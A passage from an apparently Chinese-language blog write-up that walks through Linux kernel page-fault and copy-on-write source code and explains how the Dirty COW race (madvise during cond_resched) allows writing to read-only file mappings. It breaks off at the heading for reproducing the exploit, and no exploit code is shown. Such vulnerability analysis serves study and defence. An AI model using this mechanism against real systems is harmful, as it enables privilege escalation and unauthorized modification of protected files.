对应的页可写,将该页&quot;标脏&quot; */</span></span><br><span class="line">	&#125;</span><br><span class="line">	entry = pte_mkyoung(entry);</span><br><span class="line">	<span class="keyword">if</span> (ptep_set_access_flags(vma, address, pte, entry, flags &amp; FAULT_FLAG_WRITE)) &#123;</span><br><span class="line">		update_mmu_cache(vma, address, pte);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (flags &amp; FAULT_FLAG_WRITE) <span class="comment">/* 如果存在FAULT_FLAG_WRITE标志位,表示缺页异常由写操作引起 */</span></span><br><span class="line">			flush_tlb_fix_spurious_fault(vma, address);</span><br><span class="line">	&#125;</span><br><span class="line">unlock:</span><br><span class="line">	pte_unmap_unlock(pte, ptl);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>如果该 <code>pte</code> 不在物理内存中<ul>
<li>如果 <code>pte</code> 为空，说明进程第一次访问该页面<ul>
<li>如果 <code>vma</code> 属性是匿名映射（没有真实的磁盘文件与该地址对应）</li>
<li>如果 <code>vma</code> 不是匿名，说明是文件映射，进入 <code>do_fault</code> 函数</li>
</ul>
</li>
<li>如果 <code>pte</code> 不为空，说明该页此前访问过，但是被换出了，只需要再换入即可</li>
<li>PS：<code>pte</code> 既可以索引到内存中的物理页，也可以索引交换区描述符 <code>swap_info_struct</code> 在 <code>swap_info</code> 数组的下标，以及在 <code>swap_map</code> 中的偏移量</li>
</ul>
</li>
<li>如果该 <code>pte</code> 在物理内存中，说明此次 <code>page_fault</code> 不是页面缺失引起，检查是否由写操作引起<ul>
<li>页面不可写，进入 <code>do_wp_page</code> 进行 COW 操作</li>
<li>页面可写，标记 <code>dirty</code> 位</li>
</ul>
</li>
<li><code>do_fault</code>：检查各种标志位，根据不同的情况调用不同的函数</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_fault</span><span class="params">(struct mm_struct *mm, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pte_t</span> *page_table, <span class="keyword">pmd_t</span> *pmd,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">pte_t</span> orig_pte)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">pgoff_t</span> pgoff = (((address &amp; PAGE_MASK)</span><br><span class="line">			- vma-&gt;vm_start) &gt;&gt; PAGE_SHIFT) + vma-&gt;vm_pgoff;</span><br><span class="line"></span><br><span class="line">	pte_unmap(page_table);</span><br><span class="line">	<span class="comment">/* The VMA was not fully populated on mmap() or missing VM_DONTEXPAND */</span></span><br><span class="line">	<span class="keyword">if</span> (!vma-&gt;vm_ops-&gt;fault)</span><br><span class="line">		<span class="keyword">return</span> VM_FAULT_SIGBUS;</span><br><span class="line">	<span class="keyword">if</span> (!(flags &amp; FAULT_FLAG_WRITE)) <span class="comment">/* 非写操作引起的缺页异常(读操作) */</span></span><br><span class="line">		<span class="keyword">return</span> do_read_fault(mm, vma, address, pmd, pgoff, flags,</span><br><span class="line">				orig_pte);</span><br><span class="line">	<span class="keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_SHARED)) <span class="comment">/* 非访问共享内存(私有文件映射)引起的缺页异常(写操作) */</span></span><br><span class="line">		<span class="keyword">return</span> do_cow_fault(mm, vma, address, pmd, pgoff, flags,</span><br><span class="line">				orig_pte); <span class="comment">/* 进行写时复制,缺页的COW处理函数 */</span></span><br><span class="line">	<span class="keyword">return</span> do_shared_fault(mm, vma, address, pmd, pgoff, flags, orig_pte); <span class="comment">/* 访问共享内存引起的缺页异常 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Dirty Cow 漏洞就源自于内核对 Cow 的处理不当，这里我们重点关注以下函数：</p>
<ul>
<li><code>do_wp_page</code>：不缺页的 COW 处理函数</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_wp_page</span><span class="params">(struct mm_struct *mm, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pte_t</span> *page_table, <span class="keyword">pmd_t</span> *pmd,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">spinlock_t</span> *ptl, <span class="keyword">pte_t</span> orig_pte)</span></span></span><br><span class="line"><span class="function">	__<span class="title">releases</span><span class="params">(ptl)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">old_page</span>;</span></span><br><span class="line"></span><br><span class="line">	old_page = vm_normal_page(vma, address, orig_pte);</span><br><span class="line">	<span class="keyword">if</span> (!old_page) &#123; <span class="comment">/* 当old_page是NULL时 */</span></span><br><span class="line">		<span class="keyword">if</span> ((vma-&gt;vm_flags &amp; (VM_WRITE|VM_SHARED)) ==</span><br><span class="line">				     (VM_WRITE|VM_SHARED))</span><br><span class="line">			<span class="keyword">return</span> wp_pfn_shared(mm, vma, address, page_table, ptl,</span><br><span class="line">					     orig_pte, pmd);</span><br><span class="line"></span><br><span class="line">		pte_unmap_unlock(page_table, ptl);</span><br><span class="line">		<span class="keyword">return</span> wp_page_copy(mm, vma, address, page_table, pmd,</span><br><span class="line">				    orig_pte, old_page);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (PageAnon(old_page) &amp;&amp; !PageKsm(old_page)) &#123; <span class="comment">/* 先处理匿名页面 */</span></span><br><span class="line">		<span class="keyword">if</span> (!trylock_page(old_page)) &#123;</span><br><span class="line">			page_cache_get(old_page);</span><br><span class="line">			pte_unmap_unlock(page_table, ptl);</span><br><span class="line">			lock_page(old_page);</span><br><span class="line">			page_table = pte_offset_map_lock(mm, pmd, address,</span><br><span class="line">							 &amp;ptl);</span><br><span class="line">			<span class="keyword">if</span> (!pte_same(*page_table, orig_pte)) &#123;</span><br><span class="line">				unlock_page(old_page);</span><br><span class="line">				pte_unmap_unlock(page_table, ptl);</span><br><span class="line">				page_cache_release(old_page);</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			page_cache_release(old_page);</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="comment">/* 调用reuse_swap_page判断使用该页的是否只有一个进程,若是的话就直接重用该页 */</span></span><br><span class="line">		<span class="keyword">if</span> (reuse_swap_page(old_page)) &#123;</span><br><span class="line">			page_move_anon_rmap(old_page, vma, address);</span><br><span class="line">			unlock_page(old_page);</span><br><span class="line">			<span class="keyword">return</span> wp_page_reuse(mm, vma, address, page_table, ptl,</span><br><span class="line">					     orig_pte, old_page, <span class="number">0</span>, <span class="number">0</span>); <span class="comment">/* 一般的cow流程会走到这里,重用由do_cow_fault分配好的内存页副本 */</span></span><br><span class="line">		&#125;</span><br><span class="line">		unlock_page(old_page);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (unlikely((vma-&gt;vm_flags &amp; (VM_WRITE|VM_SHARED)) ==</span><br><span class="line">					(VM_WRITE|VM_SHARED))) &#123;</span><br><span class="line">		<span class="keyword">return</span> wp_page_shared(mm, vma, address, page_table, pmd,</span><br><span class="line">				      ptl, orig_pte, old_page);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	page_cache_get(old_page);</span><br><span class="line"></span><br><span class="line">	pte_unmap_unlock(page_table, ptl);</span><br><span class="line">	<span class="keyword">return</span> wp_page_copy(mm, vma, address, page_table, pmd,</span><br><span class="line">			    orig_pte, old_page);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>do_cow_fault</code>：缺页的 COW 处理函数</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_cow_fault</span><span class="params">(struct mm_struct *mm, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pmd_t</span> *pmd,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">pgoff_t</span> pgoff, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">pte_t</span> orig_pte)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">fault_page</span>, *<span class="title">new_page</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mem_cgroup</span> *<span class="title">memcg</span>;</span></span><br><span class="line">	<span class="keyword">spinlock_t</span> *ptl;</span><br><span class="line">	<span class="keyword">pte_t</span> *pte;</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(anon_vma_prepare(vma)))</span><br><span class="line">		<span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line"></span><br><span class="line">	new_page = alloc_page_vma(GFP_HIGHUSER_MOVABLE, vma, address); <span class="comment">/* 分配新物理页 */</span></span><br><span class="line">	<span class="keyword">if</span> (!new_page)</span><br><span class="line">		<span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (mem_cgroup_try_charge(new_page, mm, GFP_KERNEL, &amp;memcg)) &#123;</span><br><span class="line">		page_cache_release(new_page);</span><br><span class="line">		<span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ret = __do_fault(vma, address, pgoff, flags, new_page, &amp;fault_page); <span class="comment">/* 查找原始映射页 */</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))</span><br><span class="line">		<span class="keyword">goto</span> uncharge_out;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (fault_page)</span><br><span class="line">		copy_user_highpage(new_page, fault_page, address, vma); <span class="comment">/* 拷贝fault_page内容到new_page */</span></span><br><span class="line">	__SetPageUptodate(new_page);</span><br><span class="line"></span><br><span class="line">	pte = pte_offset_map_lock(mm, pmd, address, &amp;ptl);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!pte_same(*pte, orig_pte))) &#123;</span><br><span class="line">		pte_unmap_unlock(pte, ptl);</span><br><span class="line">		<span class="keyword">if</span> (fault_page) &#123;</span><br><span class="line">			unlock_page(fault_page);</span><br><span class="line">			page_cache_release(fault_page);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			i_mmap_unlock_read(vma-&gt;vm_file-&gt;f_mapping);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">goto</span> uncharge_out;</span><br><span class="line">	&#125;</span><br><span class="line">	do_set_pte(vma, address, new_page, pte, <span class="literal">true</span>, <span class="literal">true</span>); <span class="comment">/* 设置pte表项  */</span></span><br><span class="line">	mem_cgroup_commit_charge(new_page, memcg, <span class="literal">false</span>);</span><br><span class="line">	lru_cache_add_active_or_unevictable(new_page, vma);</span><br><span class="line">	pte_unmap_unlock(pte, ptl);</span><br><span class="line">	<span class="keyword">if</span> (fault_page) &#123;</span><br><span class="line">		unlock_page(fault_page);</span><br><span class="line">		page_cache_release(fault_page);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		i_mmap_unlock_read(vma-&gt;vm_file-&gt;f_mapping);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">uncharge_out:</span><br><span class="line">	mem_cgroup_cancel_charge(new_page, memcg);</span><br><span class="line">	page_cache_release(new_page);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>wp_page_reuse</code>：重用由 <code>do_cow_fault</code> 分配好的内存页副本</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">wp_page_reuse</span><span class="params">(struct mm_struct *mm,</span></span></span><br><span class="line"><span class="params"><span class="function">			struct vm_area_struct *vma, <span class="keyword">unsigned</span> <span class="keyword">long</span> address,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">pte_t</span> *page_table, <span class="keyword">spinlock_t</span> *ptl, <span class="keyword">pte_t</span> orig_pte,</span></span></span><br><span class="line"><span class="params"><span class="function">			struct page *page, <span class="keyword">int</span> page_mkwrite,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">int</span> dirty_shared)</span></span></span><br><span class="line"><span class="function">	__<span class="title">releases</span><span class="params">(ptl)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">pte_t</span> entry;</span><br><span class="line">	<span class="keyword">if</span> (page)</span><br><span class="line">		page_cpupid_xchg_last(page, (<span class="number">1</span> &lt;&lt; LAST_CPUPID_SHIFT) - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	flush_cache_page(vma, address, pte_pfn(orig_pte));</span><br><span class="line">	entry = pte_mkyoung(orig_pte);</span><br><span class="line">    <span class="comment">/* 设置pte的dirty位,如果VMA是可写的,还会给pte标记可写 */</span></span><br><span class="line">	entry = maybe_mkwrite(pte_mkdirty(entry), vma);</span><br><span class="line">	<span class="keyword">if</span> (ptep_set_access_flags(vma, address, page_table, entry, <span class="number">1</span>))</span><br><span class="line">		update_mmu_cache(vma, address, page_table);</span><br><span class="line">	pte_unmap_unlock(page_table, ptl);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (dirty_shared) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> *<span class="title">mapping</span>;</span></span><br><span class="line">		<span class="keyword">int</span> dirtied;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!page_mkwrite)</span><br><span class="line">			lock_page(page);</span><br><span class="line"></span><br><span class="line">		dirtied = set_page_dirty(page);</span><br><span class="line">		VM_BUG_ON_PAGE(PageAnon(page), page);</span><br><span class="line">		mapping = page-&gt;mapping;</span><br><span class="line">		unlock_page(page);</span><br><span class="line">		page_cache_release(page);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ((dirtied || page_mkwrite) &amp;&amp; mapping) &#123;</span><br><span class="line">			balance_dirty_pages_ratelimited(mapping);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!page_mkwrite)</span><br><span class="line">			file_update_time(vma-&gt;vm_file);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> VM_FAULT_WRITE; <span class="comment">/* 这个标志表示已经做好了COW,这个页面可以写入 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接下来就重点分析一下 <code>write</code> 函数写入 VMA 对应地址的过程：</p>
<ul>
<li>前面分析到，程序执行 <code>mmap</code> 生成 VMA 结构体是只读的，并且没有设置页表项</li>
<li>接下来 <code>write</code> 的调用链如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys_write -&gt; ... -&gt; mem_rw -&gt; ... -&gt; copy_to_user -&gt; __get_user_pages</span><br></pre></td></tr></table></figure>
<ul>
<li>这里我们只需要关注最后一个函数 <code>__get_user_pages</code>：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">long</span> __get_user_pages(struct task_struct *tsk, struct mm_struct *mm,</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span> start, <span class="keyword">unsigned</span> <span class="keyword">long</span> nr_pages,</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> gup_flags, struct page **pages,</span><br><span class="line">		struct vm_area_struct **vmas, <span class="keyword">int</span> *nonblocking)</span><br><span class="line">&#123;</span><br><span class="line">    ......</span><br><span class="line">retry:</span><br><span class="line">		<span class="keyword">if</span> (unlikely(fatal_signal_pending(current)))</span><br><span class="line">			<span class="keyword">return</span> i ? i : -ERESTARTSYS;</span><br><span class="line">		cond_resched(); <span class="comment">/* 主动让出cpu资源,防止其在内核态执行时间过长导致可能发生的soft lockup或者造成较大的调度延迟 */</span></span><br><span class="line">		page = follow_page_mask(vma, start, foll_flags, &amp;page_mask); <span class="comment">/* 获取page */</span></span><br><span class="line">		<span class="keyword">if</span> (!page) &#123;</span><br><span class="line">			<span class="keyword">int</span> ret;</span><br><span class="line">			ret = faultin_page(tsk, vma, start, &amp;foll_flags,</span><br><span class="line">					nonblocking); <span class="comment">/* 处理page_fault */</span></span><br><span class="line">			<span class="keyword">switch</span> (ret) &#123; <span class="comment">/* 对返回值进行处理 */</span></span><br><span class="line">			<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">				<span class="keyword">goto</span> retry;</span><br><span class="line">			<span class="keyword">case</span> -EFAULT:</span><br><span class="line">			<span class="keyword">case</span> -ENOMEM:</span><br><span class="line">			<span class="keyword">case</span> -EHWPOISON:</span><br><span class="line">				<span class="keyword">return</span> i ? i : ret;</span><br><span class="line">			<span class="keyword">case</span> -EBUSY:</span><br><span class="line">				<span class="keyword">return</span> i;</span><br><span class="line">			<span class="keyword">case</span> -ENOENT:</span><br><span class="line">				<span class="keyword">goto</span> next_page;</span><br><span class="line">			&#125;</span><br><span class="line">			BUG();</span><br><span class="line">		&#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(__get_user_pages);</span><br></pre></td></tr></table></figure>
<ul>
<li>如果页面 page 不存在则会调用 <code>faultin_page</code> 处理异常页：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">faultin_page</span><span class="params">(struct task_struct *tsk, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">unsigned</span> <span class="keyword">int</span> *flags, <span class="keyword">int</span> *nonblocking)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">        </span><br><span class="line">	<span class="keyword">if</span> (*flags &amp; FOLL_WRITE)</span><br><span class="line">		fault_flags |= FAULT_FLAG_WRITE;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line">        </span><br><span class="line">	ret = handle_mm_fault(mm, vma, address, fault_flags); <span class="comment">/* 为发生page_fault的地址分配各级页表目录 */</span></span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line">    <span class="comment">/* 为了结束上层函数的retry循环,解决page_fault,在确定已经完成COW操作后(通过VM_FAULT_WRITE标志确定),会解除FOLL_WRITE(写请求)标志 */</span></span><br><span class="line">	<span class="keyword">if</span> ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))</span><br><span class="line">		*flags &amp;= ~FOLL_WRITE;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>设置完标志 <code>flag</code> 后，进入 <code>handle_mm_fault</code>，分配各级页表项</li>
</ul>
<p>第一次处理 <code>page_fault</code> 的流程如下：</p>
<ul>
<li>用户态函数 <code>write</code> 执行到内核中的 <code>__get_user_pages</code> 时，会因为 <code>mmap</code> 没有为 VMA 设置页表而调用 <code>faultin_page</code> 来处理 <code>page_fault</code></li>
<li>然后依次调用 <code>handle_mm_fault</code> 和 <code>handle_pte_fault</code></li>
<li>此时 <code>pte</code> 索引的物理地址不存在，<code>pte</code> 中的内容为空（没有设置页表项），VMA 地址是非匿名映射，所以会调用 <code>do_fault</code> </li>
<li>由于触发 <code>page_fault</code> 的原因为 <code>write</code> 函数的“写缺页”，因此会调用 <code>do_cow_fault</code> 进行写时复制：分配一个新页面作为文件映射内存的副本页（只读），并建立 COW 页的页表项</li>
<li>跳转回到 <code>retry</code></li>
</ul>
<p>第二次处理 <code>page_fault</code> 的流程如下：</p>
<ul>
<li>程序第二次执行 <code>follow_page_mask</code> 时因为分配了属性为不可写的 COW 页而，从而继续调用 <code>faultin_page</code> 来处理 <code>page_fault</code></li>
<li>然后依次调用 <code>handle_mm_fault</code> 和 <code>handle_pte_fault</code></li>
<li>此时 <code>pte</code> 所指向的物理地址存在（COW 分配了页表），对应的 COW 页不可写，因此程序会调用 <code>do_wp_page</code> 进行写时复制</li>
<li>由于第一次 <code>faultin_page</code> 执行 <code>do_cow_fault</code> 时已经分配了副本页，因此会直接调用 <code>wp_page_reuse</code> 重用这个页（COW 分配的页面属于匿名页），并返回 VM_FAULT_WRITE</li>
<li>返回到 <code>faultin_page</code> 中时，由于返回了 VM_FAULT_WRITE 标志，表示已经完成了 COW 页的分配，但是注意到此时 COW 页时只读的，如果我们再次进入 <code>follow_page_mask</code>，那么写和只读会冲突，又会返回 NULL，这样就会陷入 <code>retry</code> 的循环</li>
<li>Linux 为了防止该冲突，选择在 <code>faultin_page</code> 函数的最后，检查 <code>VM_FAULT_WRITE</code> 标志以确定完成了 COW 操作，然后去掉了 COW 页的 <code>FOLL_WRITE</code> 标志使其可以写入</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))</span><br><span class="line">	*flags &amp;= ~FOLL_WRITE;</span><br></pre></td></tr></table></figure>
<ul>
<li>跳转回到 <code>retry</code></li>
</ul>
<p>第三次处理 <code>page_fault</code> 的正常流程如下：</p>
<ul>
<li>由于之前去掉了 <code>FOLL_WRITE</code> 标志，因此不会检查 <code>PTE</code> 有没有写入权限，因此第三次执行 <code>follow_page_mask</code> 将会返回 COW 页</li>
<li>退出 <code>retry</code> 循环，在 COW 页上执行 <code>write</code> 的剩余工作</li>
</ul>
<p>第三次处理 <code>page_fault</code> 的异常流程如下：（触发 COW）</p>
<ul>
<li>如果我们在第二次 <code>faultin_page</code> 函数去掉 <code>flags</code> 里的 <code>FOLL_WRITE</code> 标志之后，通过竞争条件，执行 <code>madvice</code> 函数清空页表项（在 <code>get_user_page</code> 里有一步 <code>cond_resched</code> 线程调度操作，提供了条件竞争的机会）</li>
<li>线程调度结束，返回 <code>write</code> 线程，又会重新进入 <code>follow_page_mask</code> 然后因为 <code>pte</code> 被清空导致缺页，函数返回 NULL，再次进入 <code>faultin_page</code>，然后会一直运行到 <code>do_fault</code>，此时不再要求写入权限，因此程序就会认为触发页中断的原因是“读缺页”，所以会执行 <code>do_read_fault</code> 函数，建立文件映射页的页表项</li>
<li>注意：此时的可写页为 COW 页，但是该 COW 页的页表项却索引到了文件映射页所在的物理内存地址，操纵该 COW 页其实就相当于直接控制文件映射页</li>
<li>接着从 <code>do_fault</code> 返回到 <code>handle_pte_fault</code> 中，检查到页面可写，从而给页面标记 <code>dirty</code> </li>
<li>随后回到 <code>retry</code></li>
</ul>
<p>第四次处理 <code>page_fault</code> 的流程如下：</p>
<ul>
<li>第四次进入 <code>follow_page_mask</code>，不要求写权限，从而成功返回映射到文件的 COW 页（已经标记为 <code>dirty</code>，表示该页可以写入磁盘）</li>
<li>在文件映射页上执行 <code>write</code> 的剩余工作（此时虽然该映射页只读，但是内核还是可以强制写入，完成越权写操作）</li>
</ul>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_52196579/article/details/126608926?app_version=5.8.1&amp;code=app_1562916241&amp;csdn_share_tail={&quot;type&quot;%3A&quot;blog&quot;%2C&quot;rType&quot;%3A&quot;article&quot;%2C&quot;rId&quot;%3A&quot;126608926&quot;%2C&quot;source&quot;%3A&quot;m0_67072125&quot;}&amp;uLinkId=usr1mkqgl919blen&amp;utm_source=app">脏牛（Dirty COW）漏洞攻击实验(SEED-Lab：Dirty-COW Attack Lab)</a> </p>
<p><strong>Dirty Cow 漏洞复现</strong></p>
<p>1.修改服务器上 flag 文件的值：</p>
